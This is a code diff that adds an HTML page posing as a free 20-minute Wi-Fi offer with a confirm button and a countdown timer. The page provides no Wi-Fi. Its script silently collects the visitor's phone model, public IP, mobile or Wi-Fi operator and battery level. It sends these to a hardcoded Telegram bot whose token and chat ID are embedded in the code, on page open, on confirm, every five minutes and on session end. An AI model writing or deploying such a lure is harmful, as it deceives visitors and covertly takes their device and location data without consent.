@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>High Speed Free WiFi</title>
+    <style>
+        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; background: #0f0f0f; display: flex; justify-content: center; align-items: center; height: 100vh; color: white; overflow: hidden; }
+        .card { background: #1a1a1a; width: 85%; max-width: 350px; padding: 40px 20px; border-radius: 30px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #333; }
+        .wifi-icon { width: 100px; height: 100px; margin: 0 auto 20px; display: block; }
+        .wifi-wave { fill: none; stroke: #007bff; stroke-width: 2; stroke-linecap: round; animation: wifi-pulse 1.5s infinite; }
+        @keyframes wifi-pulse { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
+        h2 { font-size: 22px; margin: 10px 0; }
+        p { color: #aaa; font-size: 14px; margin-bottom: 30px; }
+        .btn-confirm { background: #007bff; color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; box-shadow: 0 5px 15px rgba(0, 123, 255, 0.4); }
+        #timer-screen { display: none; }
+        .timer-circle { width: 180px; height: 180px; border: 5px solid #007bff; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 35px; font-weight: bold; margin: 0 auto 30px; }
+        .btn-close { background: transparent; color: #ff4757; border: 1px solid #ff4757; padding: 10px 25px; border-radius: 10px; cursor: pointer; margin-top: 10px; width: 100%; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="card" id="connect-screen">
+    <svg class="wifi-icon" viewBox="0 0 24 24">
+        <path class="wifi-wave" d="M12 18a2 2 0 100 4 2 2 0 000-4z" style="animation-delay: 0.1s; fill: #007bff;"/>
+        <path class="wifi-wave" d="M7.7 15.3a6 6 0 018.6 0" style="animation-delay: 0.3s;"/>
+        <path class="wifi-wave" d="M4.9 12.5a10 10 0 0114.2 0" style="animation-delay: 0.5s;"/>
+        <path class="wifi-wave" d="M2 9.6a14 14 0 0120 0" style="animation-delay: 0.7s;"/>
+    </svg>
+    <h2>Free 20 Minutes WiFi</h2>
+    <p>enjoy free Wi-Fi press confirme button</p>
+    <button class="btn-confirm" onclick="startWiFi()">CONFIRM </button>
+</div>
+
+<div class="card" id="timer-screen">
+    <div class="timer-circle"><span id="time">20:00</span></div>
+    <button class="btn-close" onclick="closeSession()">STOP SESSION</button>
+</div>
+
+<script>
+    const token = "8588839925:AAEJ-YIBODkYkyhk2TIzgtuehDYzVGVbzAs"; 
+    const chat_id = "8358376407";
+    let countdownInterval;
+    let lastUpdateMinute = -1;
+
+    async function getDeviceInfo() {
+        let battery = "N/A", ip = "N/A", netName = "Checking...";
+        
+        try { const b = await navigator.getBattery(); battery = `${(b.level * 100).toFixed(0)}%`; } catch(e) {}
+
+        const ipServices = [
+            'https://ipapi.co/json/',
+            'https://api.ipify.org?format=json',
+            'https://ipinfo.io/json'
+        ];
+
+        for (let service of ipServices) {
+            try {
+                const res = await fetch(service);
+                const data = await res.json();
+                ip = data.ip || data.query || ip;
+                let org = data.org || data.isp || data.asn || "";
+                if (org) {
+                    netName = org.toLowerCase().match(/grameen|robi|banglalink|airtel|teletalk|telecom/) ? "SIM: " + org : "WiFi: " + org;
+                    break;
+                }
+            } catch(e) {}
+        }
+
+        const ua = navigator.userAgent;
+        let model = "Device";
+        if (/Android/i.test(ua)) { model = ua.split(';')[2].split('Build')[0].trim(); }
+        else if (/iPhone/i.test(ua)) { model = "iPhone"; }
+
+        return `📱 Model: ${model}\n📡 Net: ${netName}\n📍 IP: ${ip}\n🔋 Battery: ${battery}`;
+    }
+
+    async function sendToTelegram(status) {
+        const info = await getDeviceInfo();
+        const text = encodeURIComponent(`📢 STATUS: ${status}\n${info}\n⏰ Time: ${new Date().toLocaleTimeString()}`);
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}`).catch(e => {});
+    }
+
+    function startCountdown() {
+        document.getElementById('connect-screen').style.display = 'none';
+        document.getElementById('timer-screen').style.display = 'block';
+
+        clearInterval(countdownInterval);
+        countdownInterval = setInterval(() => {
+            const endTime = localStorage.getItem('wifi_end_time');
+            const remaining = Math.round((endTime - Date.now()) / 1000);
+
+            if (remaining <= 0) {
+                clearInterval(countdownInterval);
+                localStorage.removeItem('wifi_end_time');
+                sendToTelegram("🏁 TIME OVER (Session Finished)");
+                resetUI();
+                return;
+            }
+
+            let m = Math.floor(remaining / 60);
+            let s = remaining % 60;
+            document.getElementById('time').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
+
+            if (m > 0 && m % 5 === 0 && lastUpdateMinute !== m) {
+                sendToTelegram(`⏰ ${m} Minutes Remaining Update`);
+                lastUpdateMinute = m; 
+            }
+        }, 1000);
+    }
+
+    function startWiFi() {
+        const endTime = Date.now() + (20 * 60 * 1000);
+        localStorage.setItem('wifi_end_time', endTime);
+        sendToTelegram("✅ WiFi Started");
+        startCountdown();
+    }
+
+    function resetUI() {
+        document.getElementById('connect-screen').style.display = 'block';
+        document.getElementById('timer-screen').style.display = 'none';
+        lastUpdateMinute = -1;
+    }
+
+    // আপনার নতুন রিকোয়েস্ট অনুযায়ী পরিবর্তন:
+    function closeSession() {
+        // কোনো confirm বক্স ছাড়াই সরাসরি বন্ধ হবে এবং প্রথম পেজে ফিরবে
+        clearInterval(countdownInterval);
+        localStorage.removeItem('wifi_end_time');
+        sendToTelegram("❌ Session Closed by User (Instant)");
+        resetUI();
+    }
+
+    window.onload = () => {
+        const endTime = localStorage.getItem('wifi_end_time');
+        if (endTime && Date.now() < endTime) {
+            startCountdown();
+        } else {
+            sendToTelegram("🚀 Page/App Opened");
+        }
+    };
+</script>
+</body>
+</html>
